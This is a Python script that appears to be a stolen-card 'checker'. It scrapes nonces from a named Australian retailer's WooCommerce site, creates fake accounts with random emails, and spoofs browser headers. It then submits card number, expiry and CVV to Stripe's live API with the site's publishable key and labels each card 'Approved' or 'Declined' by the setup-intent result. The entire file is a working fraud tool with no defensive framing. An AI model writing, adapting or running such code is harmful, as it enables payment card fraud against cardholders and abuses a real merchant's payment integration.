import requests
import random
import re
import json
import time
import string
import uuid

def generate_random_email():
    """Generate a random email address"""
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    domain = random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])
    return f"{username}@{domain}"

def generate_random_password():
    """Generate a random password"""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=12))

def check_card(ccx):
    try:
        ccx = ccx.strip()
        parts = ccx.split("|")
        if len(parts) != 4:
            return {
                "cc": ccx,
                "response": "Invalid card format. Use: NUMBER|MM|YY|CVV",
                "status": "Declined",
                "gateway": "Stripe AU"
            }

        n, mm, yy, cvc = parts
        
        # Handle year format (convert 2029 to 29)
        if "20" in yy:
            yy = yy.split("20")[1]

        # Create a session
        session = requests.Session()

        # Generate random credentials for each request
        email = generate_random_email()
        password = generate_random_password()

        # Generate Stripe IDs
        stripe_mid = str(uuid.uuid4())
        stripe_sid = str(uuid.uuid4()) + str(int(time.time()))

        # Random user-agent
        user_agents = [
            "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15"
        ]
        user_agent = random.choice(user_agents)

        # Step 1: Get the registration page to extract nonce
        headers = {
            'authority': 'thefloordepot.com.au',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'priority': 'u=0, i',
            'referer': 'https://thefloordepot.com.au/my-account/add-payment-method/',
            'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user_agent,
        }

        response = session.get('https://thefloordepot.com.au/my-account/add-payment-method/', headers=headers)
        
        # Extract registration nonce
        match = re.search(r'name="woocommerce-register-nonce"\s+value="([^"]+)"', response.text)
        if not match:
            return {"cc": ccx, "response": "Registration nonce not found", "status": "Declined", "gateway": "Stripe AU"}
        
        register_nonce = match.group(1)

        # Step 2: Register a new account
        headers = {
            'authority': 'thefloordepot.com.au',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://thefloordepot.com.au',
            'priority': 'u=0, i',
            'referer': 'https://thefloordepot.com.au/my-account/add-payment-method/',
            'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user_agent,
        }

        data = {
            'email': email,
            'password': password,
            'woocommerce-register-nonce': register_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'register': 'Register',
        }

        response = session.post('https://thefloordepot.com.au/my-account/add-payment-method/', headers=headers, data=data)
        
        # Check if registration was successful
        if 'my-account/add-payment-method' not in response.url:
            return {"cc": ccx, "response": "Account registration failed", "status": "Declined", "gateway": "Stripe AU"}

        # Step 3: Get the add payment method page to extract add_card_nonce
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Pragma': 'no-cache',
            'Referer': 'https://thefloordepot.com.au/my-account/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': user_agent,
            'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        response = session.get('https://thefloordepot.com.au/my-account/add-payment-method/', headers=headers)

        # Extract add_card_nonce
        match = re.search(r'"add_card_nonce":"([a-zA-Z0-9]+)"', response.text)
        if not match:
            return {"cc": ccx, "response": "add_card_nonce not found", "status": "Declined", "gateway": "Stripe AU"}

        add_card_nonce = match.group(1)

        # Step 4: Create Stripe source
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': user_agent,
        }

        # Generate random IDs for Stripe
        guid = ''.join(random.choices('abcdef0123456789', k=32)) + ''.join(random.choices('abcdef0123456789', k=16))
        muid = stripe_mid
        sid = stripe_sid

        data = f'referrer=https%3A%2F%2Fthefloordepot.com.au&type=card&owner[name]=+&owner[email]={email}&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid={guid}&muid={muid}&sid={sid}&payment_user_agent=stripe.js%2F41ba105bc6%3B+stripe-js-v3%2F41ba105bc6%3B+split-card-element&time_on_page={random.randint(60000, 70000)}&key=pk_live_51Hu8AnJt97umck43lG2FZIoccDHjdEFJ6EAa2V5KAZRsJXbZA7CznDILpkCL2BB753qW7yGzeFKaN77HBUkHmOKD00X2rm0Tkq'

        response = session.post('https://api.stripe.com/v1/sources', headers=headers, data=data)
        stripe_response = response.json()

        if 'error' in stripe_response:
            error_message = stripe_response['error']['message']
            return {"cc": ccx, "response": error_message, "status": "Declined", "gateway": "Stripe AU"}

        id = stripe_response.get('id', '')
        if not id:
            return {"cc": ccx, "response": "Payment source creation failed", "status": "Declined", "gateway": "Stripe AU"}

        # Step 5: Create setup intent
        headers = {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://thefloordepot.com.au',
            'Pragma': 'no-cache',
            'Referer': 'https://thefloordepot.com.au/my-account/add-payment-method/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': user_agent,
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        params = {
            'wc-ajax': 'wc_stripe_create_setup_intent',
        }

        data = {
            'stripe_source_id': id,
            'nonce': add_card_nonce,
        }

        response = session.post('https://thefloordepot.com.au/', params=params, headers=headers, data=data)
        
        # Print the full response for debugging
        print(f"DEBUG - Full response text: {response.text}")
        print(f"DEBUG - Response status code: {response.status_code}")
        print(f"DEBUG - Response headers: {dict(response.headers)}")
        
        try:
            setup_data = response.json()
            print(f"DEBUG - Parsed JSON response: {setup_data}")
        except json.JSONDecodeError as e:
            print(f"DEBUG - JSON decode error: {e}")
            return {"cc": ccx, "response": f"Invalid JSON response: {response.text}", "status": "Declined", "gateway": "Stripe Auth"}

        # Extract the response message correctly
        if setup_data.get('success', False):
            # Check if data exists and has status
            if 'data' in setup_data and setup_data['data']:
                data_status = setup_data['data'].get('status')
                if data_status == 'requires_action':
                    return {"cc": ccx, "response": "Action Required", "status": "Approved", "gateway": "Stripe Auth "}
                elif data_status == 'succeeded':
                    return {"cc": ccx, "response": "Succeeded", "status": "Approved", "gateway": "Stripe Auth "}
                elif 'error' in setup_data['data']:
                    error_msg = setup_data['data']['error'].get('message', 'Unknown error')
                    return {"cc": ccx, "response": error_msg, "status": "Declined", "gateway": "Stripe Auth "}
            else:
                # If success is True but no data, check if there's a direct status
                if setup_data.get('status') == 'succeeded':
                    return {"cc": ccx, "response": "Succeeded", "status": "Approved", "gateway": "Stripe Auth "}
                else:
                    return {"cc": ccx, "response": "Success but no data returned", "status": "Approved", "gateway": "Stripe Auth "}

        # Handle error cases
        if not setup_data.get('success'):
            if 'data' in setup_data and setup_data['data'] and 'error' in setup_data['data']:
                error_msg = setup_data['data']['error'].get('message', 'Unknown error')
                return {"cc": ccx, "response": error_msg, "status": "Declined", "gateway": "Stripe Auth "}
            elif 'error' in setup_data:
                error_msg = setup_data['error'].get('message', 'Unknown error')
                return {"cc": ccx, "response": error_msg, "status": "Declined", "gateway": "Stripe Auth "}

        # Handle the case where we get a status: error response
        if setup_data.get('status') == 'error' and 'error' in setup_data:
            error_msg = setup_data['error'].get('message', 'Unknown error')
            return {"cc": ccx, "response": error_msg, "status": "Declined", "gateway": "Stripe Auth "}

        # If we get just {'status': 'success'} without data, it might be approved
        if setup_data.get('status') == 'success':
            return {"cc": ccx, "response": "Succeeded", "status": "Approved", "gateway": "Stripe Auth "}

        # Return the actual full response for debugging
        return {"cc": ccx, "response": f"Full response: {response.text}", "status": "Declined", "gateway": "Stripe Auth "}

    except Exception as e:
        import traceback
        print(f"DEBUG - Exception: {traceback.format_exc()}")
        return {"cc": ccx, "response": f"Setup Intent Failed: {str(e)}", "status": "Declined", "gateway": "Stripe Auth "}
